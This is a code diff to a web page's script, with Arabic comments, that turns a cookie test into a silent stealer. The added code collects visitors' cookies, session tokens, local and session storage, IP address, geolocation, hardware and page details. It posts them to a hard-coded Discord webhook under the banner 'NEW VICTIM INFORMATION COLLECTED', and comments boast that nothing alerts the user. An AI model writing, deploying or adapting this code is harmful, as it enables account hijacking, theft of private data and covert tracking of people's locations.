@@ -16,49 +16,189 @@
         // إنشاء ملفات تعريف ارتباط مؤقتة للاختبار
         document.cookie = "test_cookie=123; path=/";
         document.cookie = "user_session=abcxyz; path=/";
+        document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ; path=/";
 
-        function sendCookies() {
-            // جمع المعلومات
-            const cookies = document.cookie;
-            const userAgent = navigator.userAgent;
-            const language = navigator.language;
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
-            
-            // عرض المعلومات في تنبيه (للاختبار)
-            alert(`Cookies: ${cookies}\nUser Agent: ${userAgent}\nLanguage: ${language}\nScreen: ${screenWidth}x${screenHeight}`);
+        async function sendCookies() {
+            try {
+                // جمع المعلومات الأساسية
+                const cookies = document.cookie;
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const platform = navigator.platform;
+                const cpuCores = navigator.hardwareConcurrency || "Unknown";
+                const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+                
+                // معلومات الاتصال
+                let connection = "Unknown";
+                if (navigator.connection) {
+                    connection = `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.downlink || '?'} Mbps)`;
+                    if (navigator.connection.rtt) connection += ` | RTT: ${navigator.connection.rtt}ms`;
+                }
+                
+                // محاولة الحصول على IP
+                let ip = "Unknown";
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip;
+                } catch (error) {
+                    console.log("Could not fetch IP");
+                }
 
-            if (!cookies) {
-                alert("No cookies found!");
-                return;
+                // معلومات البطارية
+                let battery = "Unknown";
+                if (navigator.getBattery) {
+                    try {
+                        const batteryInfo = await navigator.getBattery();
+                        battery = `${Math.round(batteryInfo.level * 100)}% (${batteryInfo.charging ? '⚡ Charging' : '🔋 Not charging'})`;
+                    } catch (e) {
+                        battery = "Not available";
+                    }
+                }
+
+                // معلومات التوقيت المحلي
+                const localTime = new Date().toString();
+                const timezoneOffset = new Date().getTimezoneOffset();
+                
+                // محاولة الحصول على الموقع الجغرافي (إذا سمح المستخدم)
+                let geoLocation = "Not available (permission required)";
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+                    });
+                    geoLocation = `${position.coords.latitude}, ${position.coords.longitude} (Accuracy: ${Math.round(position.coords.accuracy)}m)`;
+                } catch (e) {
+                    geoLocation = "User denied or timeout";
+                }
+
+                // معلومات التخزين المحلي
+                let localStorage = "Not available";
+                try {
+                    if (window.localStorage.length > 0) {
+                        const items = [];
+                        for (let i = 0; i < window.localStorage.length; i++) {
+                            const key = window.localStorage.key(i);
+                            items.push(`${key}: ${window.localStorage.getItem(key).substring(0, 30)}${window.localStorage.getItem(key).length > 30 ? '...' : ''}`);
+                        }
+                        localStorage = items.join('\n') || "Empty";
+                    } else {
+                        localStorage = "Empty";
+                    }
+                } catch (e) {
+                    localStorage = "Access denied";
+                }
+
+                // معلومات Session Storage
+                let sessionStorage = "Not available";
+                try {
+                    if (window.sessionStorage.length > 0) {
+                        const items = [];
+                        for (let i = 0; i < window.sessionStorage.length; i++) {
+                            const key = window.sessionStorage.key(i);
+                            items.push(`${key}: ${window.sessionStorage.getItem(key).substring(0, 30)}${window.sessionStorage.getItem(key).length > 30 ? '...' : ''}`);
+                        }
+                        sessionStorage = items.join('\n') || "Empty";
+                    } else {
+                        sessionStorage = "Empty";
+                    }
+                } catch (e) {
+                    sessionStorage = "Access denied";
+                }
+
+                // معلومات الإضافات (Plugins)
+                let plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                const pluginsList = plugins.length > 0 ? plugins.join('\n') : "No plugins detected";
+
+                // معلومات الصفحة الحالية
+                const currentUrl = window.location.href;
+                const referrer = document.referrer || "No referrer";
+                const pageTitle = document.title;
+
+                // معلومات الـ DO NOT TRACK
+                const doNotTrack = navigator.doNotTrack || "Not specified";
+
+                // استبدل رابط Webhook الخاص بك هنا
+                const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
+
+                // إرسال المعلومات إلى Discord
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `**🚨 NEW VICTIM INFORMATION COLLECTED 🚨**
+
+**📋 COOKIES 📋**
+\`\`\`
+${cookies || 'No cookies found'}
+\`\`\`
+
+**🔐 TOKENS & SESSIONS 🔐**
+Token in cookies: ${cookies.includes('token') ? '✅ YES' : '❌ NO'}
+Session in cookies: ${cookies.includes('session') || cookies.includes('auth') ? '✅ YES' : '❌ NO'}
+
+**💻 SYSTEM INFO 💻**
+• **User Agent:** ${userAgent}
+• **Platform:** ${platform}
+• **Language:** ${language}
+• **Timezone:** ${timezone} (Offset: ${timezoneOffset} minutes)
+• **Local Time:** ${localTime}
+• **Do Not Track:** ${doNotTrack}
+
+**🖥️ HARDWARE 🖥️**
+• **Screen:** ${screenWidth}x${screenHeight}
+• **CPU Cores:** ${cpuCores}
+• **Memory:** ${memory}
+• **Battery:** ${battery}
+• **Connection:** ${connection}
+
+**🌐 NETWORK & LOCATION 🌐**
+• **IP Address:** ${ip}
+• **Geolocation:** ${geoLocation}
+
+**📦 STORAGE 📦**
+**Local Storage:**
+\`\`\`
+${localStorage}
+\`\`\`
+
+**Session Storage:**
+\`\`\`
+${sessionStorage}
+\`\`\`
+
+**🔧 BROWSER INFO 🔧**
+**Plugins:**
+\`\`\`
+${pluginsList}
+\`\`\`
+
+**📄 PAGE INFO 📄**
+• **Current URL:** ${currentUrl}
+• **Referrer:** ${referrer}
+• **Page Title:** ${pageTitle}
+
+**📊 ADDITIONAL INFO 📊**
+• **Cookies Enabled:** ${navigator.cookieEnabled ? '✅ Yes' : '❌ No'}
+• **Online Status:** ${navigator.onLine ? '✅ Online' : '❌ Offline'}
+• **PDF Viewer:** ${navigator.pdfViewerEnabled ? '✅ Yes' : '❌ No'}`
+                    })
+                });
+
+                // لا توجد تنبيهات! كل شيء يتم بصمت
+                console.log("Information sent successfully!");
+                
+            } catch (error) {
+                console.error("Error sending information:", error);
+                // يمكن إخفاء الخطأ أيضاً إذا أردت
             }
-
-            // استبدل رابط Webhook الخاص بك هنا
-            const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `
-**Cookies collected:**
-\`${cookies}\`
-
-**User Agent:**
-${userAgent}
-
-**Language:**
-${language}
-
-**Screen Resolution:**
-${screenWidth}x${screenHeight}
-                    `
-                })
-            });
-
-            alert("Information sent to Discord!");
         }
     </script>
 </body>
